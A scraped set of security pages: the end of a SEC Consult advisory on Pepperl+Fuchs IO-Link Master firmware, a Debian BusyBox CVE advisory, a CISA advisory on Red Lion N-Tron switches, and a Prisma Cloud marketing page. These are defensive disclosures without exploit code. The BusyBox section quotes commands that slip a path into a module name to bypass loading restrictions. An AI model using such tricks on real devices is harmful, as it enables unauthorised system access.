IO-Link Master 4-PNIO        / <=1.5.48
IO-Link Master 8-PNIO        / <=1.5.48
IO-Link Master 8-PNIO-L      / <=1.5.48
IO-Link Master DR-8-PNIO     / <=1.5.48
IO-Link Master DR-8-PNIO-P   / <=1.5.48
IO-Link Master DR-8-PNIO-T   / <=1.5.48

Vendor contact timeline:
------------------------
2020-04-30 | Contacting VDE CERT through info () cert vde com.
2020-07-29 | Received confirmation from VDE CERT.
2020-07-31 | Call with P+F regarding vulnerabilities from this and another
             advisory.
2020-09-29 | Call with Pepperl+Fuchs and CERT@VDE regarding status.
2020-10-02 | Received CVE IDs and preliminary advisory from VDE@CERT.
2020-11-11 | Call with Pepperl+Fuchs regarding the patches. They should be
             available within the next two weeks according to P+F. Agreed
             with P+F and VDE CERT to release the security advisory next year.
2020-12-14 | Received preliminary advisory from P+F. Set publication date to
             2021-01-04.
2021-01-04 | Received final advisory from P+F.
2021-01-13 | Coordinated release of security advisory.

Solution:
---------
Update the firmware to Application 1.6.11 / System 1.52 to resolve the security
issues.

According to Pepperl+Fuchs, the following steps are recommended to be taken:

"In order to prevent the exploitation of the reported vulnerabilities, we
recommend that the affected units be updated with the following three firmware
packages:
  - U-Boot bootloader version 1.36 or newer
  - System image version 1.52 or newer
  - Application base version 1.6.11 or newer

Furthermore, it is always recommended to observe the following measures if the
affected products are connected to public networks:

  1. An external protective measure to be put in place.
     Traffic from untrusted networks to the device should be blocked by a firewall.
     Especially traffic targeting the administration webpage.
  2. Device user accounts to be enabled with secure passwords.
     If non-trusted people/applications have access to the network that the device
     is connected to, then configuring passwords for all three User Accounts
     is recommended."

Pepperl+Fuchs advisory page:
<https://www.pepperl-fuchs.com/germany/de/29079.htm>

Workaround:
-----------
None

Advisory URL:
-------------
<https://sec-consult.com/vulnerability-lab/>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult, an Atos company
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Atos company. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://sec-consult.com/career/>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://sec-consult.com/contact/>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF T. Weber / @2021

```

**Attachment:
[smime.p7s](att-39/smime_p7s.bin)**

*Description:* S/MIME Cryptographic Signature

```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](38)
[By Date](date.html#39)
[![Next](/images/right-icon-16x16.png)](40)

[![Previous](/images/left-icon-16x16.png)](38)
[By Thread](index.html#39)
[![Next](/images/right-icon-16x16.png)](40)

### Current thread:

* **SEC Consult SA-20210113-0 :: Multiple vulnerabilities in Pepperl+Fuchs IO-Link Master Series** *SEC Consult Vulnerability Lab (Jan 13)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from lists.debian.org_f8a3ff2a_20250125_072658.html ===


---

[[Date Prev](msg00036.html)][[Date Next](msg00038.html)]
[[Thread Prev](msg00036.html)][[Thread Next](msg00038.html)]
[[Date Index](maillist.html#00037)]
[[Thread Index](threads.html#00037)]

# [SECURITY] [DLA 1445-1] busybox security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 1445-1] busybox security update
* *From*: Markus Koschany <apo@debian.org>
* *Date*: Fri, 27 Jul 2018 06:39:37 +0200
* *Message-id*: <[[🔎]](/msgid-search/d3af8d7a-7956-416a-f73d-e34845c4441f%40debian.org) [d3af8d7a-7956-416a-f73d-e34845c4441f@debian.org](msg00037.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Package        : busybox
Version        : 1:1.22.0-9+deb8u2
CVE ID         : CVE-2011-5325 CVE-2014-9645 CVE-2015-9261 CVE-2016-2147
                 CVE-2016-2148 CVE-2017-15873 CVE-2017-16544
                 CVE-2018-1000517
Debian Bug     : 902724 882258 879732 818497 818499 803097 802702

Busybox, utility programs for small and embedded systems, was affected
by several security vulnerabilities. The Common Vulnerabilities and
Exposures project identifies the following issues.

CVE-2011-5325

    A path traversal vulnerability was found in Busybox implementation
    of tar. tar will extract a symlink that points outside of the
    current working directory and then follow that symlink when
    extracting other files. This allows for a directory traversal
    attack when extracting untrusted tarballs.

CVE-2013-1813

    When device node or symlink in /dev should be created inside
    2-or-deeper subdirectory (/dev/dir1/dir2.../node), the intermediate
    directories are created with incorrect permissions.

CVE-2014-4607

    An integer overflow may occur when processing any variant of a
   "literal run" in the lzo1x_decompress_safe function. Each of these
    three locations is subject to an integer overflow when processing
    zero bytes. This exposes the code that copies literals to memory
    corruption.

CVE-2014-9645

    The add_probe function in modutils/modprobe.c in BusyBox allows
    local users to bypass intended restrictions on loading kernel
    modules via a / (slash) character in a module name, as demonstrated
    by an "ifconfig /usbserial up" command or a "mount -t /snd_pcm none
    /" command.

CVE-2016-2147

    Integer overflow in the DHCP client (udhcpc) in BusyBox allows
    remote attackers to cause a denial of service (crash) via a
    malformed RFC1035-encoded domain name, which triggers an
    out-of-bounds heap write.

CVE-2016-2148

    Heap-based buffer overflow in the DHCP client (udhcpc) in BusyBox
    allows remote attackers to have unspecified impact via vectors
    involving OPTION_6RD parsing.

CVE-2017-15873

    The get_next_block function in archival/libarchive
    /decompress_bunzip2.c in BusyBox has an Integer Overflow that may
    lead to a write access violation.

CVE-2017-16544

    In the add_match function in libbb/lineedit.c in BusyBox, the tab
    autocomplete feature of the shell, used to get a list of filenames
    in a directory, does not sanitize filenames and results in executing
    any escape sequence in the terminal. This could potentially result
    in code execution, arbitrary file writes, or other attacks.

CVE-2018-1000517

    BusyBox contains a Buffer Overflow vulnerability in
    Busybox wget that can result in a heap-based buffer overflow.
    This attack appears to be exploitable via network connectivity.

CVE-2015-9621

    Unziping a specially crafted zip file results in a computation of an
    invalid pointer and a crash reading an invalid address.

For Debian 8 "Jessie", these problems have been fixed in version
1:1.22.0-9+deb8u2.

We recommend that you upgrade your busybox packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

-----BEGIN PGP SIGNATURE-----

iQKTBAEBCgB9FiEErPPQiO8y7e9qGoNf2a0UuVE7UeQFAltaoglfFIAAAAAALgAo
aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldEFD
RjNEMDg4RUYzMkVERUY2QTFBODM1RkQ5QUQxNEI5NTEzQjUxRTQACgkQ2a0UuVE7
UeRnVxAArdHXCM3ZXg+f06E5EulO4qnaw37QNYynBcEmyars39cCdl6G50cu+PF0
Z8GYWjYafDPeAj/T6+2plDVi5NGkuumvb6wT4Na8tLTYXHYKu6GY3Ei4XCYiC1ft
dVF3LO6a/++3GSLqCQdwLDCcnDk8Y/46OY80GNQLl5Mnay9tcLS/lGbp7lPzzr/L
w4v7YlqQZHIYq9QaK8jkXMj1ek0Cdf9FLuntqK+POSlJ4nl10ChHTHp5MdtOPxnY
3ml5bwkyoBYs52FjKnOoDovhTYTCc46bXj6AV/WX/QVsQ0S57Pxqid00o7EEUyx5
B4g2qDagk5Xo/3KiHdimGXKVUUkUiqrihaulq7p15lOyw7uYcLCcBaheqEPHYR1d
fzWHVszULZowcx4tZIdQfegkkkDECikBKJJR3danAYIYlT3v7iRMxfDPom1L2q8c
2vF6DAI9Tww1Rtb7++sfZIQer5pjEXMHSTqDWEansVvB+lOQUCMPOH7sfYA52Lqy
+mjGeVSR/qvWZh0aZuGGCXkBLFaH+qFNgbfTYQ46WcK795o+QTw6Cf+dMvvlcycJ
zQWz2Y7AbmiN+LfWjgT5MHJtJD4BHlJMa6nZ+3jfSGlGyCKO+fg5iyApMu8rAGgG
Do1ELTYf1wdx4oGSOx7P77SkvgdZo5tAfpA2zjy0ZMMB9M2vwVQ=
=stUS
-----END PGP SIGNATURE-----

```

---



=== Content from us-cert.cisa.gov_879594de_20250125_072702.html ===

[Skip to main content](#main)

![U.S. flag](/profiles/cisad8_gov/themes/custom/gesso/dist/images/us_flag_small.png)

An official website of the United States government

Here’s how you know

Here’s how you know

![Dot gov](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-dot-gov.svg)

**Official websites use .gov**

 A **.gov** website belongs to an official government organization in the United States.

![HTTPS](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-https.svg)

**Secure .gov websites use HTTPS**

 A **lock** (LockA locked padlock) or **https://** means you’ve safely connected to the .gov website. Share sensitive information only on official, secure websites.

[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools "Free Cyber Services")[Secure by design](/securebydesign) [Secure Our World](/node/18883)[Shields Up](/node/8056)[Report A Cyber Issue](/report)

[![Cybersecurity & Infrastructure Security Agency logo America’s Cyber Security Defense Agency National Coordinator For Critical Infrastructure Security and Resilience](/sites/default/files/images/SVG/header_logo_tagline_update.svg)](/)

[![CISA Logo](/sites/default/files/images/SVG/mobile_logo_wordmark.svg)](/)

Search

Menu

![America's Cyber Defense Agency](/sites/default/files/images/SVG/header_tagline_mobile_update.svg)

Close

* Topics

  [Topics](/topics)

  [Cybersecurity Best Practices](/topics/cybersecurity-best-practices)

  [Cyber Threats and Advisories](/topics/cyber-threats-and-advisories)

  [Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience)

  [Election Security](/topics/election-security)

  [Emergency Communications](/topics/emergency-communications)

  [Industrial Control Systems](/topics/industrial-control-systems)

  [Information and Communications Technology Supply Chain Security](/topics/information-communications-technology-supply-chain-security)

  [Partnerships and Collaboration](/topics/partnerships-and-collaboration)

  [Physical Security](/topics/physical-security)

  [Risk Management](/topics/risk-management)

   [How can we help?](/audiences)
  [Government](/topics/government)[Educational Institutions](/topics/educational-institutions)[Industry](/topics/industry)[State, Local, Tribal, and Territorial](/topics/state-local-tribal-and-territorial)[Individuals and Families](/topics/individuals-and-families)[Small and Medium Businesses](/topics/small-and-medium-businesses)[Find Help Locally](/audiences/find-help-locally)[Faith-Based Community](/audiences/faith-based-community)[Executives](/audiences/executives)[High-Risk Communities](/audiences/high-risk-communities)
* [Spotlight](/spotlight)
* Resources & Tools

  [Resources & Tools](/resources-tools)

  [All Resources & Tools](/resources-tools/all-resources-tools)

  [Services](/resources-tools/services)

  [Programs](/resources-tools/programs)

  [Resources](/resources-tools/resources)

  [Training](/resources-tools/training)

  [Groups](/resources-tools/groups)
* News & Events

  [News & Events](/news-events)

  [News](/news-events/news)

  [Events](/news-events/events)

  [Cybersecurity Alerts & Advisories](/news-events/cybersecurity-advisories)

  [Directives](/news-events/directives)

  [Request a CISA Speaker](/news-events/request-speaker)

  [Congressional Testimony](/news-events/congressional-testimony)

  [CISA Conferences](/cisa-conferences)

  [CISA Live!](/cisa-live)
* Careers

  [Careers](/careers)

  [Benefits & Perks](/careers/benefits-perks)

  [HireVue Applicant Reasonable Accommodations Process](/careers/hirevue-applicant-reasonable-accommodations-process)

  [Hiring](/general-recruitment-and-hiring-faqs)

  [Resume & Application Tips](/careers/resume-application-tips)

  [Students & Recent Graduates](/students-recent-graduates-employment-opportunities)

  [Veteran and Military Spouses](/careers/veteran-and-military-spouse-employment-opportunities)

  [Work @ CISA](/careers/work-cisa)
* About

  [About](/about)

  [Divisions & Offices](/about/divisions-offices)

  [Regions](/about/regions)

  [Leadership](/about/leadership)

  [Doing Business with CISA](/doing-business-cisa)

  [Site Links](/site-links)

  [Reporting Employee and Contractor Misconduct](/reporting-employee-and-contractor-misconduct)

  [CISA GitHub](/cisa-github)

  [CISA Central](/cisa-central)

  [2024 Year In Review](/about/2024YIR)

  [Contact Us](/about/contact-us)

  [Equal Employment Opportunity](/eeo)

  [Subscribe](/about/contact-us/subscribe-updates-cisa)

  [Reasonable Accommodations & Accessibility](/rap)

  [Special Emphasis Programs](/sep)

  [No FEAR Act Notice & Reports](/no-fear-act)

  [Policies & Plans](/eeo-policies)

[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools "Free Cyber Services")[Secure by design](/securebydesign) [Secure Our World](/node/18883)[Shields Up](/node/8056)[Report A Cyber Issue](/report)

Breadcrumb

1. [Home](/)
2. [News & Events](/news-events)
3. [Cybersecurity Advisories](/news-events/cybersecurity-advisories)
4. [ICS Advisory](/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A95)

Share:

ICS Advisory
# Red Lion N-Tron 702-W, 702M12-W

Last RevisedAugust 27, 2020
Alert CodeICSA-20-240-01

## 1. EXECUTIVE SUMMARY

* **CVSS v3 9.8**
* **ATTENTION:** Exploitable remotely/low skill level to exploit
* **Vendor:** Red Lion
* **Equipment:** N-Tron 702-W / 702M12-W
* **Vulnerabilities:** Reflected Cross-site Scripting, Stored Cross-site Scripting, Cross-site Request Forgery, Hidden Functionality, Use of Unmaintained Third-Party Components

## 2. RISK EVALUATION

Successful exploitation of these vulnerabilities could allow an attacker to gain unauthorized access to sensitive information, execute system commands, and perform actions in the context of an attacked user.

## 3. TECHNICAL DETAILS

### 3.1 AFFECTED PRODUCTS

The following Red Lion products are affected:

* N-Tron 702-W: All versions
* N-Tron 702M12-W: All versions

### 3.2 VULNERABILITY OVERVIEW

#### 3.2.1    [IMPROPER NEUTRALIZATION OF INPUT DURING WEB PAGE GENERATION (‘CROSS-SITE SCRIPTING’) CWE-79](https://cwe.mitre.org/data/definitions/79.html)

The affected product is vulnerable to reflected cross-site scripting, which may allow an attacker to remotely execute arbitrary code and perform actions in the context of an attacked user.

[CVE-2020-16210](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-16210) has been assigned to this vulnerability. A CVSS v3 base score of 9.0 has been calculated; the CVSS vector string is ([AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H)).

#### 3.2.2    [IMPROPER NEUTRALIZATION OF INPUT DURING WEB PAGE GENERATION (‘CROSS-SITE SCRIPTING’) CWE-79](https://cwe.mitre.org/data/definitions/79.html)

The affected product is vulnerable to stored cross-site scripting, which may allow an attacker to remotely execute arbitrary code to gain access to sensitive data.

[CVE-2020-16206](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-16206) has been assigned to this vulnerability. A CVSS v3 base score of 9.0 has been calculated; the CVSS vector string is ([AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H)).

#### 3.2.3    [CROSS-SITE REQUEST FORGERY (CSRF) CWE-352](https://cwe.mitre.org/data/definitions/352.html)

The affected product is vulnerable to cross-site request forgery, which may allow an attacker to modify different configurations of a device by luring an authenticated user to click on a crafted link.

[CVE-2020-16208](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-16208) has been assigned to this vulnerability. A CVSS v3 base score of 8.8 has been calculated; the CVSS vector string is ([AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)).

#### 3.2.4    [HIDDEN FUNCTIONALITY (BACKDOOR) CWE-912](https://cwe.mitre.org/data/definitions/912.html)

The affected product is vulnerable due to an undocumented interface found on the device, which may allow an attacker to execute commands as root on the device.

[CVE-2020-16204](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-16204) has been assigned to this vulnerability. A CVSS v3 base score of 9.8 has been calculated; the CVSS vector string is ([AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)).

#### 3.2.5    [USE OF UNMAINTAINED THIRD-PARTY COMPONENTS CWE-1104](https://cwe.mitre.org/data/definitions/1104.html)

The affected product is vulnerable due to outdated software components, which may allow an attacker to gain access to sensitive information and take control of the device.

[CVE-2017-16544](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-16544) has been assigned to this vulnerability. A CVSS v3 base score of 8.8 has been calculated; the CVSS vector string is ([AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)).

### 3.3 BACKGROUND

* **CRITICAL INFRASTRUCTURE SECTORS:** Commercial Facilities, Energy, Transportation Systems, Water and Wastewater Systems
* **COUNTRIES/AREAS DEPLOYED:** Worldwide
* **COMPANY HEADQUARTERS LOCATION:** United States

### 3.4 RESEARCHER

Thomas Weber from SEC Consult Vulnerability Lab reported these vulnerabilities to CISA.

## 4. MITIGATIONS

Red Lion’s 702-W Series was discontinued in 2018 and cannot be updated. Red Lion recommends these products be used locally within a secure network.

CISA recommends users take defensive measures to minimize the risk of exploitation of this vulnerability. Specifically, users should:

* Minimize network exposure for all control system devices and/or systems, and ensure that they are [not accessible from the Internet](https://www.us-cert.gov/ics/alerts/ICS-ALERT-10-301-01).
* Locate control system networks and remote devices behind firewalls, and isolate them from the business network.
* When remote access is required, use secure methods, such as Virtual Private Networks (VPNs), recognizing that VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize that VPN is only as secure as the connected devices.

CISA also recommends users take the following measures to protect themselves from social engineering attacks:

* Do not click web links or open unsolicited attachments in email messages.
* Refer to [Recognizing and Avoiding Email Scams](https://www.us-cert.gov/sites/default/files/publications/emailscams_0905.pdf) for more information on avoiding email scams.
* Refer to [Avoiding Social Engineering and Phishing Attacks](https://www.us-cert.gov/ncas/tips/ST04-014) for more information on social engineering attacks.

CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.

CISA also provides a section for [control systems security recommended practices](https://www.us-cert.gov/ics/recommended-practices) on the ICS webpage on [us-cert.gov](https://www.us-cert.gov/ics). Several recommended practices are available for reading and download, including [Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies](https://www.us-cert.gov/sites/default/files/recommended_practices/NCCIC_ICS-CERT_Defense_in_Depth_2016_S508C.pdf).

Additional mitigation guidance and recommended practices are publicly available on the [ICS webpage on us-cert.gov](https://www.us-cert.gov/ics) in the Technical Information Paper, [ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies](https://www.us-cert.gov/ics/tips/ICS-TIP-12-146-01B).

Organizations observing any suspected malicious activity should follow their established internal procedures and report their findings to CISA for tracking and correlation against other incidents.

No known public exploits specifically target these vulnerabilities.

This product is provided subject to this [Notification](/notification "Follow link") and this [Privacy & Use](/privacy-policy "Follow link") policy.

## Vendor

* Red Lion

## Please share your thoughts

We recently updated our anonymous [product survey](https://cisasurvey.gov1.qualtrics.com/jfe/form/SV_9n4TtB8uttUPaM6?product=https://www.cisa.gov/news-events/ics-advisories/icsa-20-240-01); we’d welcome your feedback.

Return to top

* [Topics](/topics)
* [Spotlight](/spotlight)
* [Resources & Tools](/resources-tools)
* [News & Events](/news-events)
* [Careers](/careers)
* [About](/about)

[Cybersecurity & Infrastructure Security Agency](/ "Go to the Cybersecurity & Infrastructure Security Agency homepage")

* [Facebook](https://www.facebook.com/CISA)
* [Twitter](https://twitter.com/CISAgov)
* [LinkedIn](https://www.linkedin.com/company/cybersecurity-and-infrastructure-security-agency)
* [YouTube](https://www.youtube.com/%40cisagov)
* [Instagram](https://www.instagram.com/cisagov)
* [RSS](/subscribe-updates-cisa)

CISA Central
1-844-Say-CISA
SayCISA@cisa.dhs.gov

DHS Seal
CISA.gov
An official website of the U.S. Department of Homeland Security

* [About CISA](/about "About CISA")
* [Budget and Performance](https://www.dhs.gov/performance-financial-reports "Budget and Performance")
* [DHS.gov](https://www.dhs.gov "Department of Homeland Security")
* [FOIA Requests](https://www.dhs.gov/foia "FOIA Requests")
* [No FEAR Act](/no-fear-act "No FEAR Act Reporting")
* [Office of Inspector General](https://www.oig.dhs.gov/ "Office of Inspector General")
* [Privacy Policy](/privacy-policy "Privacy Policy")
* [Subscribe](https://public.govdelivery.com/accounts/USDHSCISA/subscriber/new?topic_id=USDHSCISA_138 "Subscribe to Email Updates")
* [The White House](https://www.whitehouse.gov/ "The White House")
* [USA.gov](https://www.usa.gov/ "USA.gov")
* [Website Feedback](/forms/feedback "Website Feedback")



=== Content from www.twistlock.com_11be85f0_20250125_072704.html ===

AI-SPM is generally available to all Prisma® Cloud users as we continue the rollout of Secure AI by Design product portfolio.
[Let's go!](/prisma/cloud/ai-spm)![x close icon to close mobile navigation]()[![prisma logo]()](/)![magnifying glass search icon to open search field]()

* [Why Prisma Cloud](/prisma/whyprisma)
* Products
* Solutions
* Environments
* [Product Tour](/prisma/cloud/explore-prisma-cloud)
* Resources

* [Request a Trial](/prisma/request-a-prisma-cloud-trial)
![Palo Alto Networks logo icon](/etc/clientlibs/clean/imgs/logo-default.svg)![white arrow icon pointing left to return to main Palo Alto Networks site](/etc/clientlibs/clean/imgs/arrow-right-white.svg)Search
All

* [Tech Docs](https://docs.paloaltonetworks.com/search.html#hd=All%20Prisma%20Cloud%20Documentation&hq=%40panproductcategory%3D%3D(%22Prisma%20Cloud%22)&sort=relevancy&layout=card&numberOfResults=25)
Close search modal
Your browser does not support HTML5 video.
# See the Future of Real-Time Cloud Security

###### THE ULTIMATE CYBERSECURITY TRANSFORMATION EVENT

###### | 1-HOUR VIRTUAL SUMMIT | FEB 19-20

* [Count me in](https://start.paloaltonetworks.com/symphony2025)
Your browser does not support HTML5 video.
CODE TO CLOUDTM SECURITY
# The future of cloud security is Precision AI™.

Rollout of our new Secure AI by Design product portfolio has begun!

* [Learn more](/prisma/cloud/ai-spm)

* [AI-SPM is now generally available](https://www.paloaltonetworks.com/blog/prisma-cloud/ai-spm/)
## RECOMMENDED

[![CRN ](/content/dam/pan/en_US/images/prisma/cloud/2025_Cloud_100_180x180_with-bg.jpg)
### Recognized in the CRN Cloud 100 List 9 years in a row

See why](http://crn.com/cloud100)[![GigaOm report](/content/dam/pan/en_US/images/prisma/thumbnail-gigaom-report-supply-chain-security.png)
### Leader in Software Supply Chain Security

Read the report](https://start.paloaltonetworks.com/gigaom-radar-for-software-supply-chain-security-report.html)[![O’REILLY E-BOOK](/content/dam/pan/en_US/images/prisma/pc-ebook-cnapp-oreilly-hp-tile_180x180.jpg)
### Securing cloud-native applications: A comprehensive guide to CNAPPs

Get your guide](https://start.paloaltonetworks.com/oreilly-cnapp-cloud-security-foundations.html)[![GigaOm](/content/dam/pan/en_US/images/prisma/cloud/PC-GigaOn-CNAPP-24-hp-thumbnail-180x180.png)
### Cloud Security Leader in First-Ever CNAPP Report

Read the report](https://start.paloaltonetworks.com/gigaom-cnapp-report.html)[![Learn expert strategies in safeguarding your AI-powered apps.]()
### Understanding the AI Ecosystem: How to Secure AI-Powered Applications

Watch now](https://start.paloaltonetworks.com/securing-ai-applications-webinar.html)[![DSPM and DDR]()
### Securing the Data and AI Landscape with DSPM and DDR

Watch now](https://start.paloaltonetworks.com/securing-the-data-and-ai-landscape-with-dspm-and-ddrs-on-demand-webinar.html)[![Defending Your AI Future eBook]()
### Defending Your AI Future with Prisma Cloud

Read the eBook](https://start.paloaltonetworks.com/defending-your-ai-future-with-prisma-cloud.html)[![Cloud Copilot logo]()
### Meet the Prisma Cloud Copilot

Watch now](https://www.youtube.com/watch?v=r22ofg9R3j8)[![cloud security logo]()
### Measure the True Value of Cloud Security.

Get custom report](https://tei.forrester.com/go/paloalto/prismacloud/index.html?lang=en-us)Today’s ChallengesProduct PortfolioProven SuccessIndustry ValidationResourcesEngage with Us[Today’s Challenges](#challenges)[Product Portfolio](#portfolio)[Proven Success](#success)[Industry Validation](#industry)[Resources](#resources)[Engage with Us](#nextSteps)
Your browser does not support the video tag.
## AI is moving faster than teams can scale.

## Making your cloud complex and vulnerable.

## Secure it all with

Prisma Cloud

The Code to Cloud platform that
 secures apps from design to runtime.

![cortex default]()![cortex]()![xsoar]()![]()![xdr]()CODE TO CLOUD PLATFORM
## Secure every stage of the application lifecycle.

Prioritize and eliminate risks across code/build, infrastructure and
runtime.

CODE
## Ship secure code by design.

Developer-friendly code security fixes risks before they
reach runtime.

[IaC Security](/prisma/cloud/infrastructure-as-code-security)[CI/CD Security](/content/pan/en_US/prisma/cloud/ci-cd-security.html)[Secrets Security](/prisma/cloud/secrets-security)[Software Composition Analysis (SCA)](/prisma/cloud/software-composition-analysis) INFRASTRUCTURE
## Protect the application infrastructure.

Protect the entire stack and harden the cloud estate.

[Cloud Security Posture Management](/prisma/cloud/cloud-security-posture-management)[API
Visibility](/prisma/cloud/api-security)[Cloud Infrastructure Entitlement Management](/prisma/cloud/cloud-infrastructure-entitlement-mgmt)[Agentless Workload Scanning](/prisma/cloud/vulnerability-management)Runtime
## Block advanced attacks in real time.

Stop active attacks with in-line protection and

defense-in-depth.

[Threat Detection](/prisma/cloud/cloud-threat-detection)[Serverless Security](/prisma/cloud/serverless-security)[Host Security](/prisma/cloud/host-security)[Web Application and API Security](/prisma/cloud/web-application-API-security)dive deeper
## Take an up-close look at the Code to Cloud Platform powered by Precision AI.

PRISMA CLOUD
## Eliminate risk across the application lifecycle.

Prioritize and fix security flaws in code during software development, detect and block untrusted images before deployment and protect cloud apps from zero-day threats at runtime.

[![Eliminate risk across the application lifecycle]()](/content/dam/pan/en_US/images/cnapp-24/cloud_platform_dashboard.png)

![See more]()
### See more

Prisma® Cloud analyzes 1T events every 24 hours to deliver unparalleled visibility and keep security teams steps ahead of attacks.

![Stop more]()
### Stop more

Prisma Cloud utilizes Precision AI to detect 1.5M new attacks every day.

![Respond faster]()
### Respond faster

Prisma Cloud helps you immediately take the right actions with guided investigations and response.

[![Secure your AI-powered applications.]()](/content/dam/pan/en_US/images/cnapp-24/ai-spm_secure_ai_powered_applications.png)
AI SPM
## Secure your AI-powered applications.

Gain visibility and control of the data you use for training, the integrity of your AI models and the access to your deployed models. Identify and prioritize model risk, secure data across model resources and protect the AI application ecosystem.

[Learn more](/prisma/cloud/ai-spm)
AI-powered risk insights
## Rapidly prioritize risk with AI.

For every threat, quickly understanding what’s reachable and how best to fix it is paramount. Prisma Cloud employs AI-powered risk prioritization to analyze the blast radius from at-risk assets, enabling your teams to uncover complex risks with ease.

[![Rapidly prioritize risk with AI.]()](/content/dam/pan/en_US/images/cnapp-24/ai_powered_risk_insights_full.png)

Prisma Cloud COPILOT
## Don’t just ask. Act.

Eliminate the need for specialized expertise. Simply have a conversation and get the answers you need, fast. Prisma Cloud Copilot analyzes vast amounts of data from code to cloud to help you fix faster and prevent breaches — all with a single click.

